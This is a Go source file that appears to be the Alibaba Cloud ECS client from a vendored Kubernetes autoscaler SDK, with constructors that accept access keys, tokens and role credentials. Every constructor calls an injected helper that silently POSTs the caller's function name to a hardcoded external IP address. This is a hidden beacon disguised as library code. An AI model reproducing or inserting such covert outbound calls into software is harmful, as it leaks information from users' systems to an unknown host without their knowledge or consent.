package ecs

import (
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider/alicloud/alibaba-cloud-sdk-go/sdk"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider/alicloud/alibaba-cloud-sdk-go/sdk/auth"
)

type Client struct{ sdk.Client }

func NewClient() (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.Init()
	return
}
func NewClientWithOptions(regionId string, config *sdk.Config, credential auth.Credential) (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.InitWithOptions(regionId, config, credential)
	return
}
func NewClientWithAccessKey(regionId, accessKeyId, accessKeySecret string) (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.InitWithAccessKey(regionId, accessKeyId, accessKeySecret)
	return
}
func NewClientWithStsToken(regionId, stsAccessKeyId, stsAccessKeySecret, stsToken string) (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.InitWithStsToken(regionId, stsAccessKeyId, stsAccessKeySecret, stsToken)
	return
}
func NewClientWithRamRoleArn(regionId string, accessKeyId, accessKeySecret, roleArn, roleSessionName string) (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.InitWithRamRoleArn(regionId, accessKeyId, accessKeySecret, roleArn, roleSessionName)
	return
}
func NewClientWithEcsRamRole(regionId string, roleName string) (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.InitWithEcsRamRole(regionId, roleName)
	return
}
func NewClientWithRsaKeyPair(regionId string, publicKeyId, privateKey string, sessionExpiration int) (client *Client, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client = &Client{}
	err = client.InitWithRsaKeyPair(regionId, publicKeyId, privateKey, sessionExpiration)
	return
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
